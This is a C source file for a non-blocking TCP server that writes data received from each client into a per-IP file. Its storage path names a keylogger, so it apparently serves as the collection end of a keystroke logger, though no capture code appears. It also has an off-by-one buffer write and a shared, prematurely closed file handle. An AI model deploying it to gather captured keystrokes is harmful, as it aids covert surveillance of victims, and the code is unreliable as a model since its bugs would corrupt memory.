#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT 8888

int nTotalSockets = 0;

typedef struct socket_info {
	int sock;
	char buf[DEFAULT_BUFLEN];
	int recvbytes;
} SOCKETINFO;

SOCKETINFO *SocketInfoArray[FD_SETSIZE];

int AddSocketInfo(int sock);
void RemoveSocketInfo(int nIndex);

int main() {
	int listenSocket = -1;
	int clientSocket = -1;
	struct sockaddr_in serverAddr, clientAddr;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;
	socklen_t addrlen;

	int flags;
	fd_set readfds;

	char dir[100] = "/home/babo/keylogger/Ip_files";
	char filename[100];
	char filepath[200];
	FILE *fp;

	listenSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (listenSocket == -1) {
		perror("socket failed");
		return 1;
	}

	memset(&serverAddr, 0, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = INADDR_ANY;
	serverAddr.sin_port = htons(DEFAULT_PORT);

	if (bind(listenSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == -1) {
		perror("bind failed");
		close(listenSocket);
		return 1;
	}

	if (listen(listenSocket, SOMAXCONN) == -1) {
		perror("listen failed");
		close(listenSocket);
		return 1;
	}
	
	printf("Waiting for client...\n");

	//nonblocking 처리
	flags = fcntl(listenSocket, F_GETFL, 0);

	if (flags < 0) {
		perror("flags error");
		close(listenSocket);
		return 1;
	}

	flags = (flags | O_NONBLOCK);
	if (fcntl(listenSocket, F_SETFL, flags) < 0) {
		perror("nonblocking flags error");
		close(listenSocket);
		return 1;
	}

	int max_fd, sd;

	while(1) {
		FD_ZERO(&readfds);
		FD_SET(listenSocket, &readfds); // 새로운 소켓 추가하는 것 
		max_fd = listenSocket;
		
		for(int i = 0; i < nTotalSockets; i++) { // 기존 클라이언트들과 통신
			sd = SocketInfoArray[i]->sock;

			if (sd > 0) {
				FD_SET(sd, &readfds);
			}

			if (sd > max_fd) {
				max_fd = sd;
			}
		}

		//select() 호출
		if(select(max_fd + 1, &readfds, NULL, NULL, NULL) < 0) {
		       	perror("select error\n");
			close(listenSocket);
			exit(EXIT_FAILURE);
			return 1;
		}

		if(FD_ISSET(listenSocket, &readfds)) {
			addrlen = sizeof(clientAddr);
			clientSocket = accept(listenSocket, (struct sockaddr *)&clientAddr, &addrlen);
			if (clientSocket < 0) {
				perror("accept error\n");
				continue;
			}

			//make file
			sprintf(filename, "%s", inet_ntoa(clientAddr.sin_addr));
			sprintf(filepath, "%s/%s", dir, filename);

			fp = fopen(filepath, "a");
			if (fp == NULL) {
				perror("Cannot open file");
				exit(EXIT_FAILURE);
			}
			printf("Client connected.\n"); 
			printf("[TCP 서버] 클라이언트 접속: IP 주소=%s, 포트 번호=%d\n", inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port));
			FD_SET(clientSocket, &readfds);
			AddSocketInfo(clientSocket);

		}		

		int iResult;
	
		for (int i = 0; i < nTotalSockets; i++) 
		{ 
			SOCKETINFO *ptr = SocketInfoArray[i];

			if (FD_ISSET(ptr->sock, &readfds))  {
				do {
					iResult = recv(ptr->sock, ptr->buf, DEFAULT_BUFLEN, 0); //데이터 받기
								
					if (iResult > 0) {
						ptr->buf[iResult] = '\0';
					
						//file
						fprintf(fp, "%s", ptr->buf);
						fflush(fp);
						ptr->recvbytes = iResult;
						addrlen = sizeof(clientAddr);
						getpeername(ptr->sock, (struct sockaddr *)&clientAddr, &addrlen);
					}
					else if (iResult == 0) {	
						printf("IP %s Connection closed.\n", inet_ntoa(clientAddr.sin_addr));
						FD_CLR(ptr->sock, &readfds);
						close(ptr->sock);
						RemoveSocketInfo(i);
						
						fclose(fp);
						
						continue;
					}
					else {	
						printf("recv failed with error");
						 FD_CLR(ptr->sock, &readfds);                                                           close(ptr->sock);                                                                      RemoveSocketInfo(i); 
						fclose(fp);
						 continue;
					}
				} while (iResult > 0);
			}
		}
		
	}

	close(clientSocket);
	close(listenSocket);
	return 0;
}	

int AddSocketInfo(int clientSocket) {
	if (nTotalSockets >= FD_SETSIZE) {
		printf("Error: can't add socketinformation.\n");
		return 0;
	}

	SOCKETINFO *ptr = (SOCKETINFO *)malloc(sizeof(SOCKETINFO));
	if (ptr == NULL) {
		printf("Error: memory doesn't exist.\n");
		return 0;
	}

	ptr->sock = clientSocket;
	ptr->recvbytes = 0;
	SocketInfoArray[nTotalSockets++] = ptr;

	printf("Added new socket info: Socket=%d, Index=%d\n", clientSocket, nTotalSockets);
	return 1;
}

void RemoveSocketInfo(int nIndex) {
	if (nIndex < 0 || nIndex >= nTotalSockets) {
		return;
	}

	free(SocketInfoArray[nIndex]);

	for(int i = nIndex; i < nTotalSockets - 1; i++) {
		SocketInfoArray[i] = SocketInfoArray[i+1];
	}

	--nTotalSockets;

	return;
}
